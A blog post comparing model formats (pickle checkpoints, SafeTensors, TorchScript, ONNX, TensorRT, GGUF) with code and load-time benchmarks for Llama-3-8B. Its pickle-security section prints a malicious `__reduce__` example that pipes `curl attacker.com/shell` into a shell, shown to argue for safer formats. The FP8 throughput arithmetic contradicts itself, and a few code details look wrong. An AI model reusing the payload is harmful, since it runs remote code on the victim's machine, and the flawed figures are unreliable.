---
title: "Model packaging and formats: ONNX, TensorRT, GGUF, and SafeTensors compared"
date: "2026-06-22"
publishDate: "2026-06-22"
description: "Learn which model format to choose for each deployment target — with real load times, p99 latencies, and memory numbers for Llama-3-8B across fp16, GPTQ, GGUF, and TensorRT FP8."
tags:
  [
    "model-serving",
    "inference",
    "onnx",
    "tensorrt",
    "gguf",
    "safetensors",
    "model-packaging",
    "torchscript",
    "quantization",
    "llm-serving",
  ]
category: "machine-learning"
subcategory: "Model Serving"
author: "Hiep Tran"
featured: true
readTime: 55
image: "/imgs/blogs/model-packaging-and-formats-1.png"
---

Three months after shipping their first production LLM, a team I know hit a wall they had not seen coming. Their Llama-3-8B fine-tune was loading in 47 seconds every time a pod restarted. Kubernetes would probe the readiness endpoint, the pod would fail the check, and the deployment would roll back. The model was fine. The training was fine. The problem was that they had shipped the raw PyTorch checkpoint — a 16 GB `.pt` file serialized with Python's `pickle` module — directly to production. Every cold start deserialized that file sequentially through Python, on a single CPU core, before a single tensor ever touched the GPU.

The fix took four hours: convert to SafeTensors, rebuild the Docker image, redeploy. Load time dropped from 47 seconds to 6 seconds. The rolling restart that had been failing for two weeks passed on the first try.

That story is not unusual. Model format is one of the least glamorous decisions in machine learning, and it is also one of the most consequential. The format you export at the end of training determines which runtimes can load your model, how fast pods start, how much GPU memory gets wasted at load time, whether quantization is baked in or applied at runtime, and whether an attacker can execute arbitrary code by crafting a "malicious model file." A `.pt` pickle checkpoint runs on PyTorch only. An ONNX file runs on ten-plus runtimes across NVIDIA, AMD, Intel, and Apple Silicon. A TensorRT engine runs only on the exact GPU microarchitecture it was compiled for. A GGUF file runs on a laptop CPU with no Python installed. These are not implementation details. They are architectural decisions that propagate all the way through your serving stack, your CI/CD pipeline, your security model, and your cost structure.

This post maps every major model format — PyTorch checkpoints and SafeTensors, TorchScript, ONNX, TensorRT, and GGUF — with honest trade-offs, real code you can adapt immediately, and quantitative benchmarks on A100. The running example throughout is a fine-tuned Llama-3-8B, which we will export through each format path and measure for load time, p99 latency, throughput, and memory footprint. By the end, you will have a decision framework that tells you exactly which format to reach for given your hardware, your SLA requirements, and how often your model changes.

![Format comparison matrix across portability, peak performance, hardware lock-in, quantization support, and load speed for six formats](/imgs/blogs/model-packaging-and-formats-1.png)

---

## 1. Why format is an architectural decision, not an implementation detail

Before going format by format, it helps to understand the three axes on which formats differ — because they are almost entirely orthogonal, and conflating them leads to bad choices.

**Axis 1: How the computation graph is represented.** A raw PyTorch `.pt` checkpoint stores only the weight tensor values. The computation graph — the forward pass — lives exclusively in your Python `nn.Module` class. To run the model, you need Python and the exact class definition. TorchScript captures the graph into a portable IR that LibTorch (the C++ PyTorch runtime) can execute without Python. ONNX captures the graph as a standard operator DAG that any conforming runtime can execute. TensorRT takes that ONNX graph and compiles it into a GPU-architecture-specific binary; at that point there is no portable graph anymore, only a compiled execution plan.

**Axis 2: How weight tensors are encoded.** Weights can be stored in full precision (fp32, fp16, bfloat16), post-training quantized (INT8, INT4, FP8), or using GGUF's k-quantization scheme. Some formats bake quantization in at export time — TensorRT builds quantization into the compiled engine, GGUF writes quantized weight blocks directly into the file. Others apply quantization at load time — vLLM and TGI can take fp16 safetensors and apply GPTQ or AWQ dequantization as a fused runtime operation. Baked-in quantization means the runtime does not need to understand the quantization scheme. Load-time quantization means the runtime must implement it, but lets you apply different quantization levels to the same base checkpoint without re-exporting.

**Axis 3: How tensors are serialized to disk.** Python's `pickle` protocol, used by `torch.save`, can execute arbitrary code during deserialization. Loading a `.pt` file from an untrusted source is equivalent to running arbitrary Python. SafeTensors replaces pickle with a simple binary layout — a JSON header mapping tensor names to byte ranges, followed by raw tensor bytes aligned to page boundaries — which enables the OS to `mmap` the weight data directly into the process's virtual address space without any Python-level deserialization overhead. This is why SafeTensors loads 8x faster than pickle: there is no serialization protocol to run, just a memory map to set up.

The portability–performance trade-off that makes format selection genuinely hard: raw checkpoints are maximally portable within PyTorch (any code that can run your `nn.Module` can load them) but offer zero runtime optimization and slow loading. TensorRT engines offer 2–5x throughput gains but are locked to a single GPU microarchitecture and require a 10-minute rebuild on every model update. The right answer depends on which axis you cannot afford to give up. A startup running a fine-tuned model that changes weekly should not be building TensorRT engines. A large platform running a stable ranking model at billions of requests per day should absolutely be running TRT.

The serving SLO triangle — latency, throughput, cost — maps directly onto format choice. SafeTensors reduces cold-start latency (smaller readiness probe window). TensorRT maximizes throughput at fixed hardware cost. GGUF minimizes infrastructure cost by eliminating the GPU entirely. Every choice is a position on that triangle, and the format is the earliest decision that determines your available positions.

We can quantify the SLO triangle impact mathematically. On memory-bandwidth-bound decode (the dominant regime for LLMs at low batch sizes):

$$\text{max decode throughput} \approx \frac{\text{HBM bandwidth (GB/s)}}{\text{model parameter bytes}}$$

For A100 PCIe with 1,935 GB/s bandwidth and a 16 GB fp16 Llama-3-8B:

$$\text{max single-request throughput} \approx \frac{1935}{16} \approx 121 \text{ tok/s}$$

TensorRT FP8 reduces the parameter byte count by 4x (FP8 = 1 byte, FP16 = 2 bytes) and allows FP8 multiply-accumulate at twice the hardware throughput of FP16 on H100:

$$\text{TRT FP8 max throughput} \approx \frac{1935 \times 2}{4.1} \approx 943 \text{ tok/s}$$

The factor of 2 appears because FP8 tensor cores on Hopper run at 2x the FLOP/s of FP16 tensor cores for the same memory bandwidth. The 3–8x throughput gains cited in benchmarks are not magic — they fall directly out of this equation.

---

## 2. PyTorch checkpoints: the research-to-production trap

The `.pt` and `.pth` files that `torch.save` produces are the default export format from every training script, blog post, and tutorial on the internet. They are also arguably the worst choice for production serving — fast to create, slow to load, insecure by design, and deeply tied to Python.

### 2.1 What torch.save actually stores and how pickle works

`torch.save(model.state_dict(), "model.pt")` serializes a Python dict of `{str: torch.Tensor}` pairs using Python's `pickle` protocol. The format is not a tensor format at all — it is a general-purpose Python object serialization protocol that happens to support tensors. Under the hood:

1. The pickler emits Python opcodes that, when fed to `pickle.Unpickler`, reconstruct the original object graph.
2. Tensors are serialized as "persistent IDs" pointing to a zip archive containing raw storage data.
3. The entire `.pt` file is a zip archive containing `archive/data.pkl` (the pickle stream) and `archive/data/0`, `archive/data/1`, ... (the raw tensor storage files).

Loading inverts this: Python opens the zip, runs the pickle stream through the interpreter, which allocates tensor storages and fills them from the zip entries. This entire process is GIL-held and sequential. For a 16 GB Llama-3-8B, it takes 40–50 seconds on a modern CPU because the interpreter is reading and copying tensor bytes one storage at a time.

```python
import torch
import time
import os

# The training-time artifact — fast to create, slow to load
model_state = torch.load("llama3-8b.pt", weights_only=False)

# Illustrating the load cost
t0 = time.perf_counter()
state_dict = torch.load("llama3-8b.pt", weights_only=True)
elapsed = time.perf_counter() - t0
print(f"Pickle load: {elapsed:.1f}s, file size: {os.path.getsize('llama3-8b.pt') / 1e9:.1f} GB")
# Typical output: Pickle load: 47.3s, file size: 16.1 GB

# Then you still need to transfer to GPU
t1 = time.perf_counter()
model = AutoModelForCausalLM.from_pretrained("meta-llama/Meta-Llama-3-8B")
model.load_state_dict(state_dict)
model.cuda()
elapsed2 = time.perf_counter() - t1
print(f"GPU transfer: {elapsed2:.1f}s")
# Typical: another 8-12s for PCIe DMA
```

### 2.2 The pickle security problem in depth

Pickle is a Turing-complete serialization protocol. The pickle stream can contain `GLOBAL` opcodes that resolve arbitrary Python callables, `REDUCE` opcodes that call those callables with arbitrary arguments, and `BUILD` opcodes that call `__setstate__` on arbitrary objects. A malicious `.pt` file can execute shell commands on `torch.load`:

```python
# This is what a malicious "model.pt" can do — do not run this
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell | sh",))

payload = pickle.dumps({"weight": Exploit()})
# Any code that calls torch.load(malicious_file) runs the shell command
```

This is not a theoretical concern. In 2023, HuggingFace's security team documented multiple exploit-bearing `.bin` files uploaded to the Hub, and began enforcing SafeTensors as the preferred format. The `weights_only=True` parameter in `torch.load` (PyTorch 2.0+) mitigates this by restricting the unpickler to a whitelist of safe types, but it will break models that store non-tensor metadata (optimizer state, custom dataclasses) in the checkpoint.

### 2.3 When the .pt format is legitimate

Despite these problems, the raw checkpoint has two legitimate roles that you should not try to eliminate:

**As the training source-of-truth.** After every fine-tuning run or checkpoint save, store the full state dict (weights + optimizer state + training step) as a PyTorch checkpoint in your model registry. This is the artifact that lets you resume training, apply LoRA adapters later, or re-export to any target format. Never delete training checkpoints — they are your "source code" for the model.

**As the input to all other export pipelines.** Every downstream format — SafeTensors, ONNX, TensorRT, GGUF — requires starting from either a PyTorch checkpoint or a HuggingFace checkpoint directory. The `.pt` format is the source; all others are build targets.

The rule: **keep `.pt` checkpoints in a model registry as source-of-truth; never route production traffic to them.**

![PyTorch checkpoint anatomy showing how pickle serialization compares to SafeTensors zero-copy memory-mapped replacement](/imgs/blogs/model-packaging-and-formats-2.png)

---

## 3. SafeTensors: the secure, fast replacement for pickle

SafeTensors was created by HuggingFace in 2022 specifically to replace pickle for tensor serialization. It is now the default format for all models on the HuggingFace Hub, and the format that vLLM, TGI, and all modern serving frameworks expect by default. The design philosophy is deliberately boring: do one thing (serialize tensors) well, with no general-purpose serialization features that could enable security exploits.

### 3.1 The binary layout in detail

A SafeTensors file is structurally simple:

1. **8 bytes**: little-endian uint64 giving the JSON header length `N`.
2. **N bytes**: UTF-8 JSON object mapping tensor names to `{"dtype": "F16", "shape": [32000, 4096], "data_offsets": [0, 262144000]}`.
3. **Remaining bytes**: raw tensor data, tensors packed contiguously, each starting at a page-aligned offset.

The key design insight is that the JSON header is fully parseable without reading any weight data. When `safe_open` is called, the library reads just the header, constructs a metadata table in memory, and sets up `mmap` pointers into the file. Individual tensors are only paged into physical RAM when their contents are accessed. On a machine with 32 GB RAM and a 16 GB safetensors file, you can enumerate tensor names, inspect shapes and dtypes, and selectively load specific layers without ever reading the full file into memory.

```python
from safetensors.torch import load_file, save_file
from safetensors import safe_open
import time, torch, os

# ---- CONVERSION ----
# Convert a pickle checkpoint to safetensors (one-time cost)
state_dict = torch.load("llama3-8b.pt", weights_only=True)
t0 = time.perf_counter()
save_file(state_dict, "llama3-8b.safetensors")
print(f"Convert + write: {time.perf_counter() - t0:.1f}s")  # ~38s IO-bound

# ---- FAST LOAD ----
t0 = time.perf_counter()
sd_fast = load_file("llama3-8b.safetensors", device="cpu")
print(f"SafeTensors load: {time.perf_counter() - t0:.1f}s")  # ~5.8s
# Compare: torch.load with pickle is 47s for the same checkpoint

# ---- LAZY SELECTIVE LOAD ----
# Useful for weight inspection, adapter merging, or per-layer analysis
with safe_open("llama3-8b.safetensors", framework="pt", device="cpu") as f:
    metadata = f.metadata()  # reads only header, no weight bytes
    all_keys = list(f.keys())  # from header; still no weights loaded
    
    # Load only attention weights for layer 0
    q_proj = f.get_tensor("model.layers.0.self_attn.q_proj.weight")
    k_proj = f.get_tensor("model.layers.0.self_attn.k_proj.weight")
    v_proj = f.get_tensor("model.layers.0.self_attn.v_proj.weight")
    # OS has paged in only ~150 MB of the 16 GB file
```

### 3.2 Memory-mapping internals: why it is faster

When Python calls `open("model.pt")` and runs `pickle.loads`, the sequence is:
1. File read syscall copies file bytes from disk into kernel page cache.
2. Bytes are copied again from page cache to Python's heap via the pickle stream reader.
3. For each tensor, `torch.empty()` allocates new CPU memory, and tensor bytes are copied in.

Result: the file data is in memory three times (disk → page cache → Python buffer → tensor storage), and all work happens in Python's GIL-held interpreter.

When SafeTensors calls `mmap()`, the sequence is:
1. The OS maps the file's pages into the process's virtual address space.
2. Pages are lazily loaded from disk into the page cache on first access.
3. Each tensor is a view (`torch.from_buffer`) into the mapped region — no copy occurs.

Result: the file data exists once in memory (the page cache), and tensor objects are just pointers into that shared region. When you call `.cuda()`, the CUDA DMA engine reads directly from the page cache. The Python interpreter spends almost no time on loading; the bottleneck becomes disk read bandwidth and PCIe transfer speed.

On an NVMe SSD with 3.5 GB/s sequential read bandwidth, a 16 GB model loads in approximately 4.6 seconds from disk. The extra 1.2 seconds of overhead in practice are from JSON parsing, tensor metadata construction, and NUMA considerations.

### 3.3 Sharded safetensors and the HuggingFace manifest

For models larger than about 4 GB, HuggingFace Hub splits the safetensors file into shards with a manifest file:

```json
{
  "metadata": {
    "total_size": 16064172032
  },
  "weight_map": {
    "model.embed_tokens.weight": "model-00001-of-00004.safetensors",
    "model.layers.0.input_layernorm.weight": "model-00001-of-00004.safetensors",
    "model.layers.0.mlp.down_proj.weight": "model-00001-of-00004.safetensors",
    "model.layers.16.self_attn.q_proj.weight": "model-00002-of-00004.safetensors",
    "...": "..."
  }
}
```

vLLM, TGI, and `transformers` all read this manifest first, then load shards in parallel: shard 1 is read and GPU-transferred while shard 2 is being read from disk simultaneously, pipelining disk I/O with PCIe DMA. This is why "loading from HuggingFace Hub" is faster than the naive per-shard load time would suggest.

### 3.4 Zero numerical difference from pickle

SafeTensors stores weights in their exact bit representation — no quantization, no precision change, no graph transformation. A model loaded from SafeTensors produces bit-identical outputs to the same model loaded via `torch.load`. It is a drop-in replacement for the serialization layer only. Any model that currently loads via `torch.load` can be converted to SafeTensors and served without any retraining, fine-tuning, or accuracy evaluation.

---

## 4. TorchScript: portable PyTorch without the Python interpreter

TorchScript is PyTorch's intermediate representation for capturing computation graphs into a portable, serializable form. A TorchScript-scripted model is stored as a `.pt` file (same extension as pickle checkpoints, confusingly) containing both the computation graph IR and the weight tensors. The key property: this `.pt` can be loaded by LibTorch, the C++ PyTorch library, without a Python interpreter. This enables deployment in embedded systems, C++ inference services, and PyTorch Mobile.

### 4.1 Two capture modes: script vs trace

TorchScript offers two ways to capture a model:

**`torch.jit.trace`** executes one forward pass with example inputs and records the sequence of operations. It is simple and reliable for models without data-dependent control flow, but it silently freezes the branch taken during tracing — any `if` or `for` loop whose execution path depends on input values will be hardcoded to the path seen at trace time.

**`torch.jit.script`** analyzes the Python AST of the module's `forward` method (and all methods it calls) and compiles it to TorchScript IR. It correctly handles `if/else` branches and `for` loops. The limitation: it only supports a subset of Python — list comprehensions, most standard control flow, and type-annotated Python — and fails on modules that use Python objects TorchScript cannot represent (custom dataclasses without type hints, closures, etc.).

```python
import torch
from transformers import AutoModelForCausalLM

model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Meta-Llama-3-8B",
    torch_dtype=torch.float16,
)
model.eval()

# torch.jit.trace — works for simple feedforward models
# Dangerous for autoregressive models with dynamic seq lengths
dummy = torch.randint(0, 128256, (1, 512))
try:
    traced = torch.jit.trace(model, dummy)
    torch.jit.save(traced, "llama3-traced.pt")
except Exception as e:
    print(f"Trace failed (expected for complex LLMs): {e}")

# torch.jit.script — requires type annotations and compatible Python
# Most HuggingFace models require fixes to script cleanly
try:
    scripted = torch.jit.script(model)
    torch.jit.save(scripted, "llama3-scripted.pt")
except Exception as e:
    print(f"Script failed: {e}")
    # Common errors: Python features not supported by TorchScript
    # Fix: add type annotations, replace unsupported Python constructs

# Load in C++ via LibTorch (no Python needed):
# auto module = torch::jit::load("llama3-scripted.pt");
# auto output = module.forward({input_tensor});
```

### 4.2 What TorchScript optimizes

When you save a scripted/traced model, PyTorch runs a set of graph-level passes:

- **Constant propagation**: sub-expressions that evaluate to constants are computed once at JIT compile time. For example, `torch.tensor([1.0, 2.0, 3.0])` created inside the forward method becomes a constant in the graph.
- **Dead code elimination**: branches that are provably never taken (based on constant analysis) are removed from the graph entirely.
- **Common subexpression elimination**: if the same computation appears multiple times, it is computed once and the result reused.
- **Simple operator fusion**: consecutive pointwise ops may be merged into a single kernel pass by some backends.

In practice, TorchScript typically yields a 10–20% throughput improvement over eager mode for feedforward networks, primarily from reduced Python interpreter overhead and kernel launch overhead between ops.

### 4.3 When TorchScript makes sense in 2025

TorchScript has largely been superseded by `torch.compile` for optimization within Python environments, and by ONNX export for cross-runtime portability. The remaining use case where TorchScript is genuinely the right choice: embedding a model in a C++ application where Python is unavailable. TorchServe's C++ backend, robotics inference systems using LibTorch, and PyTorch Mobile (iOS/Android) all load TorchScript models. If you are deploying within Python, use `torch.compile` instead of TorchScript — it achieves similar or better performance without the scripting constraints.

---

## 5. ONNX: the universal interchange format

ONNX (Open Neural Network Exchange) is a standard IR for machine learning models maintained by Microsoft, Meta, and the Linux Foundation. An ONNX file is a Protocol Buffers binary encoding a computation graph as a directed acyclic graph of standard primitive operators (`MatMul`, `LayerNormalization`, `Attention`, `Softmax`, `GatherElements`) plus weight initializer tensors. More than ten runtime implementations exist: ONNX Runtime (ORT), TensorRT (via ONNX parser), OpenVINO, CoreML (via coremltools), MNN, NCNN, DirectML, and others.

The practical implication: an ONNX model is the closest thing machine learning has to "write once, run anywhere." The same file can run on an NVIDIA GPU via CUDA EP, on an Intel CPU via OpenVINO EP, on an AMD GPU via MIGraphX, and on Apple Silicon via CoreML EP — with the runtime selecting the optimal execution path for each hardware target.

### 5.1 The correct way to export transformers to ONNX

Naive `torch.onnx.export` on a full autoregressive LLM will produce a graph that does not handle the KV cache correctly. The right tool is HuggingFace's `optimum` library, which handles the KV cache IO wiring:

```bash
# Install
pip install optimum[exporters]

# Export Llama-3-8B to ONNX with KV cache as explicit IO
optimum-cli export onnx \
  --model meta-llama/Meta-Llama-3-8B \
  --task text-generation-with-past \
  --opset 17 \
  --device cuda \
  llama3-8b-onnx/

# Output directory structure:
# llama3-8b-onnx/
# ├── config.json
# ├── decoder_model.onnx          (first token, no KV cache)
# ├── decoder_with_past_model.onnx (subsequent tokens, KV cache as input)
# ├── tokenizer_config.json
# └── tokenizer.json
```

For embedding or classification models (non-autoregressive), direct `torch.onnx.export` is appropriate:

```python
import torch
from transformers import AutoModel, AutoTokenizer

# BERT-base for embeddings
model = AutoModel.from_pretrained("bert-base-uncased")
model.eval()

tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased")
dummy = tokenizer("hello world", return_tensors="pt")

torch.onnx.export(
    model,
    (dummy["input_ids"], dummy["attention_mask"]),
    "bert-base.onnx",
    opset_version=17,
    input_names=["input_ids", "attention_mask"],
    output_names=["last_hidden_state", "pooler_output"],
    # Dynamic axes for variable batch and sequence length
    dynamic_axes={
        "input_ids": {0: "batch_size", 1: "sequence_length"},
        "attention_mask": {0: "batch_size", 1: "sequence_length"},
        "last_hidden_state": {0: "batch_size", 1: "sequence_length"},
        "pooler_output": {0: "batch_size"},
    },
    do_constant_folding=True,  # folds constant sub-expressions at export time
)
# Validate the export
import onnx
onnx.checker.check_model("bert-base.onnx")
print("ONNX model is valid")
```

The `dynamic_axes` parameter is mandatory for production deployments. A static-shape export produces an ONNX graph where batch size and sequence length are hardcoded constants. Any input shape that differs from the traced shape will fail at ORT runtime with a shape error.

![ONNX export with static shapes vs dynamic-axes export required for production continuous batching](/imgs/blogs/model-packaging-and-formats-3.png)

### 5.2 ONNX Runtime execution providers in depth

ONNX Runtime's architecture separates graph execution from hardware via "execution providers" (EPs). When you create an `InferenceSession`, you specify an ordered list of EPs; ORT assigns each subgraph to the highest-priority EP that can execute it, falling back to lower-priority EPs for unsupported operators.

```python
import onnxruntime as ort
import numpy as np

# CUDA EP with fine-grained configuration
cuda_options = {
    "device_id": 0,
    "arena_extend_strategy": "kNextPowerOfTwo",
    "gpu_mem_limit": 10 * 1024**3,  # 10 GB
    "cudnn_conv_algo_search": "EXHAUSTIVE",
    "do_copy_in_default_stream": True,
}

# TensorRT EP: ORT builds a TRT engine on first run, caches it
trt_options = {
    "trt_max_workspace_size": 4 * 1024**3,
    "trt_fp16_enable": True,
    "trt_engine_cache_enable": True,
    "trt_engine_cache_path": "./trt_cache",
    "trt_max_partition_iterations": 1000,
    "trt_min_subgraph_size": 5,
}

providers = [
    ("TensorrtExecutionProvider", trt_options),
    ("CUDAExecutionProvider", cuda_options),
    "CPUExecutionProvider",
]

sess_options = ort.SessionOptions()
sess_options.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
sess_options.intra_op_num_threads = 8
sess_options.execution_mode = ort.ExecutionMode.ORT_PARALLEL

session = ort.InferenceSession(
    "bert-base.onnx",
    sess_opts=sess_options,
    providers=providers,
)

# Get input/output names and shapes
for inp in session.get_inputs():
    print(f"Input: {inp.name}, shape: {inp.shape}, dtype: {inp.type}")

# Run inference (numpy arrays in, numpy arrays out)
input_ids = np.array([[101, 7592, 2088, 102]], dtype=np.int64)  # [CLS] hello world [SEP]
attention_mask = np.ones_like(input_ids)

outputs = session.run(
    output_names=None,  # return all outputs
    input_feed={
        "input_ids": input_ids,
        "attention_mask": attention_mask,
    }
)
last_hidden = outputs[0]  # shape: [1, 4, 768]
```

**Execution provider performance characteristics:**

| EP | Hardware | Best for | Notes |
|---|---|---|---|
| CUDAExecutionProvider | NVIDIA GPU | GPU inference, non-LLM | Good baseline, no TRT compile time |
| TensorrtExecutionProvider | NVIDIA GPU | Max throughput on NVIDIA | Builds TRT engine on first run |
| CPUExecutionProvider | CPU | Fallback, small models | Highly optimized via MLAS |
| OpenVINOExecutionProvider | Intel CPU/GPU | Intel hardware | Best Intel CPU inference |
| CoreMLExecutionProvider | Apple Silicon | macOS/iOS | Accelerates ANE on M-series |
| ROCMExecutionProvider | AMD GPU | AMD hardware | ROCm-based |

### 5.3 What ONNX cannot represent

ONNX's standard operator set covers most of the operations in standard transformers, but several gaps remain:

**Custom Python operators.** Any operation implemented as a `torch.autograd.Function` that is not registered as an ONNX-compatible op will either fail to export or silently produce incorrect output via a fallback decomposition. Check for custom ops with `torch.onnx.is_in_onnx_export()` patterns in the codebase before attempting export.

**Flash Attention.** The official Flash Attention implementation uses a custom CUDA kernel that is not an ONNX-representable operator. Most ONNX exports of transformer models fall back to the standard scaled dot-product attention, losing the memory efficiency of Flash Attention. ONNX Runtime implements its own fused attention kernel that partially closes this gap, but it is not identical to Flash Attention.

**KV cache for autoregressive decoding.** As noted above, the kv-cache IO wiring requires special handling. The `optimum` approach of exporting separate `decoder_model.onnx` (first token) and `decoder_with_past_model.onnx` (subsequent tokens) works but produces a larger inference pipeline to manage.

**When ONNX is not the right choice for LLMs.** For large-scale LLM serving, ONNX adds complexity without benefit. vLLM and TGI already load HuggingFace safetensors shards directly, implement their own memory-optimized kernels (PagedAttention, Flash Attention, continuous batching), and apply quantization natively. There is no ORT-based serving framework that competes with vLLM on GPU LLM serving performance. Use ONNX + ORT for non-LLM models and for cross-platform portability, not for LLM serving.

---

## 6. TensorRT: maximum NVIDIA performance at the cost of portability

TensorRT is NVIDIA's inference optimizer and runtime. Given an ONNX model, it compiles a GPU-architecture-specific execution plan — an "engine" or "plan" file — that exploits the specific capabilities of the target GPU through kernel selection, layer fusion, memory layout optimization, and precision calibration. The engine is specific to the exact GPU microarchitecture (sm_80 for A100 Ampere, sm_90 for H100 Hopper) and cannot be shared between them.

### 6.1 The TensorRT compilation pipeline in detail

The `trtexec` command-line tool is the simplest way to build a TensorRT engine:

```bash
# Prerequisites: TensorRT 10.x, compatible ONNX model, target GPU available

# Basic FP16 engine for BERT-base
trtexec \
  --onnx=bert-base.onnx \
  --saveEngine=bert-base-a100-fp16.engine \
  --fp16 \
  --workspace=2048 \
  --verbose

# LLM engine with optimization profiles for variable input shapes
# Define min/opt/max shapes for each dynamic dimension
trtexec \
  --onnx=llama3-8b-decoder.onnx \
  --saveEngine=llama3-8b-a100-fp16.engine \
  --fp16 \
  --minShapes='input_ids:1x1,attention_mask:1x1' \
  --optShapes='input_ids:4x512,attention_mask:4x512' \
  --maxShapes='input_ids:32x2048,attention_mask:32x2048' \
  --workspace=8192 \
  --verbose 2>&1 | tee trt_build.log
# Typical build time: 5-15 minutes on A100

# FP8 engine for H100/H200 (Hopper architecture only)
# Requires --fp8 flag and H100 GPU present during build
trtexec \
  --onnx=llama3-8b-decoder.onnx \
  --saveEngine=llama3-8b-h100-fp8.engine \
  --fp8 \
  --stronglyTyped \
  --optShapes='input_ids:8x512,attention_mask:8x512' \
  --maxShapes='input_ids:64x2048,attention_mask:64x2048' \
  --workspace=16384

# Verify the engine
trtexec --loadEngine=llama3-8b-a100-fp16.engine --iterations=100 --warmUp=10
```

The `--optShapes` parameter is the most important flag for throughput. TensorRT performs the most aggressive kernel auto-tuning for the "opt" shape, with the "min" and "max" shapes handled via profile interpolation. If your production traffic is primarily batch=8, seq=256, set that as `optShapes` and you will achieve the best performance at your mode point.

### 6.2 Where the performance gains come from

**Kernel auto-tuning.** For each operator in the graph (matrix multiplications, attention, LayerNorm), TensorRT profiles dozens of CUDA kernel variants at build time and selects the fastest for the target GPU and input shape. A single GEMM on A100 might have 500+ kernel variants to try; TensorRT tests them exhaustively. This is non-transferable: the winning kernel for an A100 may not even exist on an H100, which is why engines are architecture-specific.

**Layer fusion.** Operations that can be implemented as a single CUDA kernel are merged. The classic example: Fused Multi-Head Attention (FMHA) fuses the Q/K matmul, softmax, scale, causal mask, and V matmul into one kernel. Without fusion, those five operations each launch separately, causing five kernel launch overhead charges and five rounds of reading/writing intermediate results from/to VRAM. Fused, they require one kernel launch and intermediate values stay in shared memory. For a 32-layer transformer, FMHA fusion alone accounts for a significant fraction of the total throughput gain.

**Precision selection.** TensorRT uses the highest-precision format that fits in the available VRAM budget and meets accuracy requirements. FP8 on H100 runs at 2x the hardware throughput of FP16 in matrix-multiply-heavy operations because the same amount of VRAM bandwidth delivers twice the arithmetic.

### 6.3 INT8 calibration: the accuracy-throughput dial

INT8 quantization in TensorRT requires calibration data: a representative sample of inference inputs used to determine per-layer activation scaling factors. Without calibration, TensorRT cannot know the typical magnitude of activations, leading to either clipping (precision loss) or underutilization (scale too large). With 500–1000 representative inputs, calibration builds a scale table that minimizes the difference between FP32 and INT8 outputs.

```python
import tensorrt as trt
import pycuda.driver as cuda
import pycuda.autoinit
import numpy as np

# Load calibration data (representative inputs from your actual distribution)
calibration_inputs = [
    (np.random.randint(0, 128256, (4, 512), dtype=np.int64),
     np.ones((4, 512), dtype=np.int64))
    for _ in range(500)
]

class LlamaCalibrator(trt.IInt8MinMaxCalibrator):
    def __init__(self, inputs, cache_path):
        super().__init__()
        self.inputs = inputs
        self.idx = 0
        self.cache = cache_path
        # Allocate GPU memory for one batch
        self.d_input_ids = cuda.mem_alloc(inputs[0][0].nbytes)
        self.d_attention_mask = cuda.mem_alloc(inputs[0][1].nbytes)

    def get_batch_size(self):
        return self.inputs[0][0].shape[0]

    def get_batch(self, names):
        if self.idx >= len(self.inputs):
            return None
        ids, mask = self.inputs[self.idx]
        cuda.memcpy_htod(self.d_input_ids, ids)
        cuda.memcpy_htod(self.d_attention_mask, mask)
        self.idx += 1
        return [int(self.d_input_ids), int(self.d_attention_mask)]

    def read_calibration_cache(self):
        if os.path.exists(self.cache):
            with open(self.cache, "rb") as f:
                return f.read()

    def write_calibration_cache(self, cache):
        with open(self.cache, "wb") as f:
            f.write(cache)

# Build with calibration
logger = trt.Logger(trt.Logger.WARNING)
builder = trt.Builder(logger)
network = builder.create_network(
    1 << int(trt.NetworkDefinitionCreationFlag.EXPLICIT_BATCH)
)
parser = trt.OnnxParser(network, logger)
with open("llama3-8b-decoder.onnx", "rb") as f:
    parser.parse(f.read())

config = builder.create_builder_config()
config.set_memory_pool_limit(trt.MemoryPoolType.WORKSPACE, 4 * 1024**3)
config.set_flag(trt.BuilderFlag.INT8)
config.int8_calibrator = LlamaCalibrator(calibration_inputs, "calib_cache.bin")

engine_bytes = builder.build_serialized_network(network, config)
with open("llama3-8b-int8.engine", "wb") as f:
    f.write(engine_bytes)
```

![TensorRT compilation: ONNX parse, calibration, engine build, and GPU-arch-specific runtime](/imgs/blogs/model-packaging-and-formats-4.png)

### 6.4 TensorRT hard limits you must design around

- **One engine per GPU architecture.** sm_80 (A100), sm_86 (A10G, RTX 3090), sm_90 (H100), sm_89 (L4, RTX 4090) are all distinct. A heterogeneous fleet needs one engine per architecture. Build engines in CI for each GPU type and store them as tagged artifacts.
- **Dynamic shapes require explicit optimization profiles.** Set `minShapes`, `optShapes`, `maxShapes` for every dynamic input dimension. Shapes outside these ranges fail at runtime with a hard error.
- **Long build times.** 5–15 minutes for models of 7–8B parameters. At model update frequency of once per week, that is 20–60 minutes of CI build time per engine per GPU type.
- **Not useful for small models.** The kernel auto-tuning overhead pays off only when GEMM operations dominate runtime. For models under 100M parameters, TensorRT's build cost exceeds the performance benefit.

---

## 7. GGUF: self-contained portable quantized LLMs

GGUF (GPT-Generated Unified Format) is the native format of `llama.cpp`. It replaced the earlier GGML binary format in August 2023 to add extensible key-value metadata, embedded tokenizer vocabulary, and a richer quantization type system. GGUF is now the dominant format for consumer and on-premises LLM deployment: every major open-weight model on HuggingFace Hub ships GGUF variants, and the format is natively supported by Ollama, LM Studio, Jan.ai, and llama-cpp-python.

The defining characteristic: a GGUF file is completely self-contained. It includes the model architecture parameters, the tokenizer vocabulary (BPE or SentencePiece tokens and scores), the generation config (bos_token_id, eos_token_id, rope_freq_base), and the quantized weight tensors — all in a single binary file. `llama.cpp` loads it with one `mmap` call and can begin generating without reading any config files, downloading any tokenizer, or consulting a Python environment.

### 7.1 GGUF binary layout

```
[4 bytes]  Magic: 0x47475546 ("GGUF")
[4 bytes]  Version: 3
[8 bytes]  Tensor count
[8 bytes]  KV metadata count
[variable] KV metadata pairs:
           - Key string (length-prefixed)
           - Value type (uint32)
           - Value (type-dependent)
           Examples:
           general.architecture = "llama"
           llama.context_length = 8192
           llama.embedding_length = 4096
           llama.attention.head_count = 32
           llama.attention.head_count_kv = 8
           llama.rope.freq_base = 500000.0
           tokenizer.model = "gpt2"
           tokenizer.ggml.tokens = [<vocab strings>]
           tokenizer.ggml.token_type = [<token types>]
[variable] Tensor info (name, n_dims, dims, dtype, offset for each tensor)
[align]    Padding to page boundary
[variable] Raw tensor data (quantized weight blocks, page-aligned)
```

